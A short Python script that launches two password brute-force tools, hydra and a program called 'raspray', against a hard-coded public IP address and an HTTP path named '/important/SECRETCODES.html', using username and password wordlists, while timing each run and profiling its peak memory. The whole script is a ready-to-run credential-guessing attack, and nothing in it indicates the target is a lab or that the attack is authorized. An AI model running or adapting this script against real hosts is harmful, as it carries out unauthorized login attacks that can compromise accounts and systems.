import time
import subprocess
from memory_profiler import memory_usage
def run_program(type):
    commands = [
        ["hydra", "-L", "usernames.txt", "-P", "passwords.txt", "18.188.93.218", "http-get", "/important/SECRETCODES.html"],
        ["./raspray", "-u", "usernames.txt", "-p", "passwords.txt", "-i", "18.188.93.218"]
    ]
    # Measure runtime
    start_time = time.time()
    process = subprocess.Popen(commands[type], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    end_time = time.time()
    runtime = end_time - start_time
    
    # Print command output
    print("Results from running", commands[type][0], ":")
    print("Output:", stdout.decode())
    print("Error Output:", stderr.decode())
    print(f"Runtime of {commands[type][0]} command: {runtime:.2f} seconds")

# Measure memory usage
def profile_memory_usage(num):
    """Profiles memory usage of the Hydra command."""
    mem_usage = memory_usage((run_program, (num,)), max_iterations=10, interval=0.05)
    peak_memory = max(mem_usage)
    print(f"Peak Memory Usage: {peak_memory:.2f} MB")

# Execute the memory profiling and runtime measurement
if __name__ == "__main__":
    profile_memory_usage(0)
    time.sleep(10)
    profile_memory_usage(1)
    